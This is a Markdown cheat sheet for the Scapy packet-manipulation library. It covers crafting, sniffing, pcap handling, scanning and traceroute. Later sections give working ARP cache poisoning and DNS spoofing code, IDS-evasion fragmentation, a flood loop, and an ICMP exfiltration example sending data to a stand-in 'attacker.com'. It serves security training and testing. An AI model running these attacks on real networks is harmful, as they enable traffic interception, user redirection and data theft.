# Scapy (Interactive Packet Manipulation and Network Forensics)

> For authorized security testing, CTF competitions, and educational purposes only.

Scapy is a Python-based interactive packet manipulation library and tool that enables crafting, sending, sniffing, dissecting, and forging network packets. Unlike traditional tools that are locked to specific protocols, Scapy gives you raw access to build any protocol stack layer by layer, making it invaluable for protocol testing, network reconnaissance, and security research.

---

## Installation and Setup

### Getting Started

```bash
# Install Scapy
pip install scapy

# Install with optional dependencies (plotting, crypto)
pip install scapy[complete]

# Install on system level
apt install python3-scapy      # Debian/Ubuntu
brew install scapy              # macOS (via Homebrew)

# Run Scapy interactive console
sudo scapy                      # needs root for raw sockets

# Run without root (limited functionality)
scapy                           # can still craft/dissect, no send/sniff

# Verify installation
python3 -c "from scapy.all import *; print(conf.version)"

# Configure default interface
# conf.iface = 'eth0'
# conf.verb = 0                # suppress output
# conf.L3socket = L3RawSocket  # use raw sockets
```

## Packet Construction

### Building Packets Layer by Layer

```bash
# Basic packet construction (layers stacked with /)
# pkt = IP(dst="192.168.1.1") / TCP(dport=80)
# pkt = Ether() / IP(dst="10.0.0.1") / TCP(dport=443, flags="S")
# pkt = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))

# Inspect packet structure
# pkt.show()                   # display all fields
# pkt.show2()                  # display with computed fields
# ls(TCP)                      # list all TCP fields
# ls(IP)                       # list all IP fields

# Access and modify fields
# pkt[IP].src = "10.0.0.5"
# pkt[TCP].sport = 12345
# pkt[TCP].flags = "SA"        # SYN-ACK
# pkt[IP].ttl = 128

# Raw payload
# pkt = IP(dst="10.0.0.1") / TCP(dport=80) / Raw(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")

# Hexdump of packet
# hexdump(pkt)

# Export packet as bytes
# raw_bytes = bytes(pkt)

# Build packet from raw bytes
# pkt = IP(raw_bytes)
# pkt = Ether(raw_bytes)       # if includes Ethernet header

# Multiple targets (generates packet list)
# pkts = IP(dst="192.168.1.0/24") / ICMP()
# pkts = IP(dst="10.0.0.1") / TCP(dport=[80, 443, 8080])
# pkts = IP(dst="10.0.0.1", ttl=(1,30)) / ICMP()  # range of TTLs
```

## Sending and Receiving Packets

### Transmitting at Different Layers

```bash
# Layer 3 send (IP and above, OS handles Ethernet)
# send(IP(dst="10.0.0.1") / ICMP())
# send(pkt, count=5)            # send 5 copies
# send(pkt, inter=0.5)          # 0.5 second interval
# send(pkt, loop=1, inter=1)    # send forever, 1/sec

# Layer 2 send (full Ethernet frame, you control everything)
# sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP())
# sendp(pkt, iface="eth0")

# Send and receive (wait for response)
# ans, unans = sr(IP(dst="10.0.0.1") / ICMP())
# ans, unans = sr(IP(dst="10.0.0.1") / TCP(dport=80, flags="S"), timeout=2)

# Send one packet and get one response
# resp = sr1(IP(dst="8.8.8.8") / ICMP(), timeout=2)
# if resp:
#     resp.show()

# Layer 2 send/receive
# ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"), timeout=2)

# Flood mode (fast, no response tracking)
# send(IP(dst="10.0.0.1") / UDP(dport=53), loop=1, inter=0)

# Async sniff + send
# ans, unans = sr(IP(dst="10.0.0.0/24") / ICMP(), timeout=5, multi=True)
```

## Sniffing and Capture

### Packet Capture and Filtering

```bash
# Basic sniffing
# pkts = sniff(count=100)                      # capture 100 packets
# pkts = sniff(timeout=30)                      # capture for 30 seconds
# pkts = sniff(iface="eth0", count=50)          # specific interface

# BPF filter (same syntax as tcpdump)
# pkts = sniff(filter="tcp port 80", count=50)
# pkts = sniff(filter="icmp", count=10)
# pkts = sniff(filter="host 10.0.0.1 and tcp", count=20)
# pkts = sniff(filter="udp port 53", count=10)

# Callback function (process each packet in real-time)
# def packet_handler(pkt):
#     if pkt.haslayer(TCP):
#         print(f"{pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")
#
# sniff(filter="tcp", prn=packet_handler, count=50)

# Store packets and apply callback
# pkts = sniff(filter="tcp port 443", prn=lambda p: p.summary(), count=20, store=True)

# Stop condition
# sniff(stop_filter=lambda p: p.haslayer(TCP) and p[TCP].flags == "FA", timeout=60)

# Offline sniffing (read from pcap)
# pkts = sniff(offline="capture.pcap")
# pkts = rdpcap("capture.pcap")

# Sniff on multiple interfaces
# pkts = sniff(iface=["eth0", "wlan0"], count=100)
```

## PCAP Read/Write

### Working with Capture Files

```bash
# Write packets to pcap
# wrpcap("output.pcap", pkts)

# Read packets from pcap
# pkts = rdpcap("capture.pcap")

# Access packets by index
# first_pkt = pkts[0]
# last_ten = pkts[-10:]

# Filter loaded packets
# tcp_pkts = [p for p in pkts if p.haslayer(TCP)]
# http_pkts = [p for p in pkts if p.haslayer(TCP) and p[TCP].dport == 80]

# Packet list operations
# pkts.summary()               # one-line summary per packet
# pkts.conversations()         # show conversations (graphviz)
# pkts.sessions()              # group by TCP session

# Export to different formats
# wrpcap("out.pcap", pkts)                    # standard pcap
# import json
# for p in pkts[:5]:
#     print(p.command())                       # Scapy reconstruction command

# Append to existing pcap
# PcapWriter("output.pcap", append=True).write(pkt)
```

## Network Scanning

### Host and Port Discovery

```bash
# ARP scan (local network discovery)
# ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
#     ARP(pdst="192.168.1.0/24"), timeout=2)
# for sent, received in ans:
#     print(f"{received[ARP].psrc} -> {received[Ether].src}")

# ICMP ping sweep
# ans, unans = sr(IP(dst="192.168.1.0/24") / ICMP(), timeout=2)
# alive = [rcv[IP].src for snd, rcv in ans]
# print(f"Alive hosts: {alive}")

# TCP SYN scan (half-open)
# ans, unans = sr(IP(dst="10.0.0.1") /
#     TCP(dport=[21,22,23,25,53,80,110,143,443,445,3306,8080],
#         flags="S"), timeout=2)
# for snd, rcv in ans:
#     if rcv[TCP].flags == "SA":  # SYN-ACK = open
#         print(f"Port {rcv[TCP].sport} is OPEN")
#     elif rcv[TCP].flags == "RA":  # RST-ACK = closed
#         print(f"Port {rcv[TCP].sport} is CLOSED")

# UDP scan
# ans, unans = sr(IP(dst="10.0.0.1") /
#     UDP(dport=[53, 67, 68, 69, 123, 161, 162, 514]),
#     timeout=3)
# # No response = open|filtered, ICMP unreachable = closed

# TCP connect scan with banner grab
# def banner_grab(host, port):
#     pkt = IP(dst=host) / TCP(dport=port, flags="S")
#     resp = sr1(pkt, timeout=2, verbose=0)
#     if resp and resp[TCP].flags == "SA":
#         # Complete handshake
#         send(IP(dst=host) / TCP(dport=port, sport=resp[TCP].dport,
#              flags="A", ack=resp[TCP].seq+1), verbose=0)
#         return f"Port {port}: OPEN"
#     return f"Port {port}: CLOSED"

# OS fingerprinting via TTL
# resp = sr1(IP(dst="10.0.0.1") / ICMP(), timeout=2)
# ttl = resp[IP].ttl
# if ttl <= 64: print("Likely Linux/macOS")
# elif ttl <= 128: print("Likely Windows")
# elif ttl <= 255: print("Likely Solaris/Network device")
```

## Traceroute

### Network Path Discovery

```bash
# TCP traceroute (more likely to pass firewalls)
# ans, unans = traceroute(["google.com", "cloudflare.com"],
#     dport=443, maxttl=30)
# ans.graph()                  # display graphviz graph

# ICMP traceroute
# ans, unans = sr(IP(dst="8.8.8.8", ttl=(1,30)) / ICMP(), timeout=3)
# for snd, rcv in sorted(ans, key=lambda x: x[0][IP].ttl):
#     print(f"TTL {snd[IP].ttl:2d}: {rcv[IP].src}")

# UDP traceroute (traditional)
# ans, unans = sr(IP(dst="8.8.8.8", ttl=(1,30)) /
#     UDP(dport=33434) / Raw(b"X"*40), timeout=3)

# DNS traceroute
# ans, unans = traceroute("example.com", l4=UDP(dport=53) /
#     DNS(rd=1, qd=DNSQR(qname="example.com")), maxttl=25)

# Paris traceroute (consistent path, fixed flow label)
# pkts = IP(dst="8.8.8.8", ttl=(1,30)) / UDP(dport=33434, sport=12345)
# ans, unans = sr(pkts, timeout=3)
```

## ARP Cache Poisoning

### Man-in-the-Middle via ARP

```bash
# ARP cache poisoning (MITM positioning)
# target_ip = "192.168.1.100"
# gateway_ip = "192.168.1.1"
# target_mac = getmacbyip(target_ip)
# gateway_mac = getmacbyip(gateway_ip)

# Tell target that we are the gateway
# pkt_to_target = Ether(dst=target_mac) / ARP(
#     op="is-at",
#     psrc=gateway_ip,           # pretend to be gateway
#     pdst=target_ip,
#     hwdst=target_mac)

# Tell gateway that we are the target
# pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
#     op="is-at",
#     psrc=target_ip,            # pretend to be target
#     pdst=gateway_ip,
#     hwdst=gateway_mac)

# Send continuously
# while True:
#     sendp(pkt_to_target, verbose=0)
#     sendp(pkt_to_gateway, verbose=0)
#     time.sleep(2)

# Restore ARP tables (cleanup)
# sendp(Ether(dst=target_mac) / ARP(
#     op="is-at", psrc=gateway_ip, hwsrc=gateway_mac,
#     pdst=target_ip, hwdst=target_mac), count=5, verbose=0)
# sendp(Ether(dst=gateway_mac) / ARP(
#     op="is-at", psrc=target_ip, hwsrc=target_mac,
#     pdst=gateway_ip, hwdst=gateway_mac), count=5, verbose=0)

# Enable IP forwarding (to maintain connectivity)
# echo 1 > /proc/sys/net/ipv4/ip_forward    # Linux
# sysctl -w net.inet.ip.forwarding=1         # macOS
```

## DNS Spoofing

### DNS Response Forgery

```bash
# DNS spoof via sniff + respond
# def dns_spoof(pkt):
#     if pkt.haslayer(DNSQR):
#         qname = pkt[DNSQR].qname.decode()
#         if "target-domain.com" in qname:
#             spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
#                 UDP(dport=pkt[UDP].sport, sport=53) / \
#                 DNS(id=pkt[DNS].id, qr=1, aa=1,
#                     qd=pkt[DNS].qd,
#                     an=DNSRR(rrname=qname, rdata="10.0.0.99"))
#             send(spoofed, verbose=0)
#             print(f"Spoofed {qname} -> 10.0.0.99")
#
# sniff(filter="udp port 53", prn=dns_spoof)

# Craft DNS query
# dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / \
#     DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))
# resp = sr1(dns_query, timeout=2)
# resp[DNS].show()

# DNS zone transfer attempt
# dns_axfr = IP(dst="ns.target.com") / TCP(dport=53) / \
#     DNS(qd=DNSQR(qname="target.com", qtype="AXFR"))

# Multiple record types
# dns_mx = IP(dst="8.8.8.8") / UDP(dport=53) / \
#     DNS(rd=1, qd=DNSQR(qname="example.com", qtype="MX"))
# dns_ns = IP(dst="8.8.8.8") / UDP(dport=53) / \
#     DNS(rd=1, qd=DNSQR(qname="example.com", qtype="NS"))
# dns_txt = IP(dst="8.8.8.8") / UDP(dport=53) / \
#     DNS(rd=1, qd=DNSQR(qname="example.com", qtype="TXT"))
```

## Protocol Dissection and Custom Protocols

### Parsing and Building Custom Layers

```bash
# Define a custom protocol layer
# class MyProto(Packet):
#     name = "MyProtocol"
#     fields_desc = [
#         ByteField("version", 1),
#         ShortField("length", None),
#         IntField("session_id", 0),
#         ByteEnumField("msg_type", 0, {
#             0: "HELLO", 1: "DATA", 2: "BYE"
#         }),
#         StrLenField("payload", b"",
#             length_from=lambda p: p.length - 7),
#     ]
#     def post_build(self, pkt, payload):
#         if self.length is None:
#             pkt = pkt[:1] + struct.pack("!H", len(pkt)) + pkt[3:]
#         return pkt + payload

# Bind custom layer to a port
# bind_layers(TCP, MyProto, dport=9999)
# bind_layers(TCP, MyProto, sport=9999)

# Now Scapy auto-dissects traffic on port 9999
# pkts = sniff(filter="tcp port 9999", count=10)
# pkts[0][MyProto].show()

# Dissect raw bytes with custom layer
# raw = b'\x01\x00\x0b\x00\x00\x00\x01\x01HELLO'
# pkt = MyProto(raw)
# pkt.show()

# Built-in protocol dissection
# pkt = IP(raw_bytes)
# pkt.show()
# pkt[TCP].payload
# pkt.getlayer(Raw).load     # raw payload bytes
```

## Advanced Techniques

### Evasion and Manipulation

```bash
# IP fragmentation
# frags = fragment(IP(dst="10.0.0.1") /
#     TCP(dport=80) / Raw(b"A"*1000), fragsize=100)
# send(frags)

# TCP segment overlapping (IDS evasion)
# seg1 = IP(dst="10.0.0.1") / TCP(dport=80, seq=1000) / Raw(b"GET")
# seg2 = IP(dst="10.0.0.1") / TCP(dport=80, seq=1001) / Raw(b"POST")
# send([seg1, seg2])

# Craft VLAN-tagged frames (802.1Q)
# pkt = Ether() / Dot1Q(vlan=100) / IP(dst="10.0.0.1") / ICMP()
# sendp(pkt)

# GRE tunnel encapsulation
# pkt = IP(dst="tunnel_endpoint") / GRE() / IP(dst="10.0.0.1") / ICMP()

# IPv6 packets
# pkt = IPv6(dst="::1") / ICMPv6EchoRequest()
# resp = sr1(pkt, timeout=2)

# Craft TLS ClientHello (raw)
# tls_hello = IP(dst="10.0.0.1") / TCP(dport=443, flags="S")
# # After 3-way handshake, send TLS data

# ICMP tunneling (data exfiltration)
# data = b"exfiltrated_data_here"
# pkt = IP(dst="attacker.com") / ICMP(type=8) / Raw(data)
# send(pkt)
```

---

## Tips

- Always run Scapy with `sudo` or root privileges; raw socket access requires elevated permissions for sending and sniffing
- Use `conf.verb = 0` to suppress default output when scripting; enable `conf.verb = 2` for debugging
- The `/` operator stacks layers; order matters -- Ether/IP/TCP/Raw builds a complete frame from bottom to top
- Use `pkt.show2()` instead of `pkt.show()` to see computed fields like checksums and lengths filled in
- Set `timeout` on all `sr()`/`sr1()` calls to avoid hanging indefinitely on unresponsive targets
- Use BPF filters in `sniff()` to reduce capture volume; kernel-level filtering is far more efficient than Python filtering
- Always restore ARP tables after poisoning experiments; lingering bad ARP entries disrupt networks
- Use `wrpcap()` to save interesting packets for offline analysis with Wireshark or other tools
- For large-scale scanning, consider `sr()` with the `multi=True` flag to handle multiple responses per probe
- Build custom protocol layers with `Packet` subclasses when testing proprietary protocols

---

## See Also

- wireshark
- tcpdump
- nmap
- reverse-engineering

## References

- [Scapy Official Documentation](https://scapy.readthedocs.io/)
- [Scapy GitHub Repository](https://github.com/secdev/scapy)
- [Scapy Usage Documentation](https://scapy.readthedocs.io/en/latest/usage.html)
- [Philippe Biondi - Scapy Paper](https://www.secdev.org/projects/scapy/)
- [Network Packet Manipulation with Scapy (SANS)](https://www.sans.org/white-papers/33249/)
- [Python Scapy Cheat Sheet](https://wiki.sans.blue/Tools/pdfs/ScapyCheatSheet_v0.2.pdf)
